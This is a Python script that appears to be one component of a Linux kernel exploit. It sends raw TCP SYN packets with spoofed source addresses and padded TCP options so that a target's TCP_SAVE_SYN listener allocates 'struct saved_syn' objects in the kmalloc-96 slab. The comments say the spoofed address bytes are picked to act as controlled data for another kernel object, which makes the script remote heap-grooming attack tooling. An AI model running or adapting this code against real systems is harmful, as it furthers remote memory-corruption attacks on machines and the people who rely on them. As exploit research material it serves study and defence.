#!/usr/bin/env python3
"""saved_syn_probe.py - send a no-IP-option TCP SYN with 40 bytes of TCP
options so the target's TCP_SAVE_SYN listener allocates a kmalloc-96
struct saved_syn (12 + 20 IP + 60 TCP = 92) without a competing
tcp_v4_save_options allocation.

  saved_syn_probe.py <sport> [count]
"""
import os
import random
import socket
import struct
import sys
import time

DST = os.environ.get("DST", "192.168.89.2")
SRC = os.environ.get("SRC", "192.67.68.69")   # 192 -> optlen=192, srr=67
DPORT = int(os.environ.get("DPORT", "9801"))
FIXED = os.environ.get("FIXED") is not None
DELAY = float(os.environ.get("DELAY", "0.2"))


def csum(d):
    if len(d) & 1:
        d += b"\0"
    s = 0
    for i in range(0, len(d), 2):
        s += (d[i] << 8) | d[i + 1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def tcp_opts():
    # 40 bytes: MSS(4) + SACKOK(2) + NOP,NOP,TS(12) + NOP*22
    o = struct.pack("!BBH", 2, 4, 1460)          # MSS
    o += struct.pack("!BB", 4, 2)                # SACK permitted
    o += b"\x01\x01" + struct.pack("!BBII", 8, 10, 0x11223344, 0)
    o += b"\x01" * 22
    assert len(o) == 40, len(o)
    return o


def main():
    sport = int(sys.argv[1])
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    opts = tcp_opts()
    for i in range(count):
        seq = random.getrandbits(32)
        sp = sport if FIXED else sport + i
        tcp = struct.pack("!HHIIBBHHH", sp, DPORT, seq, 0, 15 << 4, 0x02,
                          65535, 0, 0) + opts
        pseudo = socket.inet_aton(SRC) + socket.inet_aton(DST) + struct.pack("!BBH", 0, 6, len(tcp))
        c = csum(pseudo + tcp)
        tcp = tcp[:16] + struct.pack("!H", c) + tcp[18:]
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp),
                         random.getrandbits(16), 0x4000, 64, 6, 0,
                         socket.inet_aton(SRC), socket.inet_aton(DST))
        ic = csum(ip)
        ip = ip[:10] + struct.pack("!H", ic) + ip[12:]
        s.sendto(ip + tcp, (DST, 0))
        sp = sport if FIXED else sport + i
        print(f"{time.monotonic():.6f} saved_syn sport={sp} src={SRC}", flush=True)
        if DELAY > 0:
            time.sleep(DELAY)
    s.close()


if __name__ == "__main__":
    main()
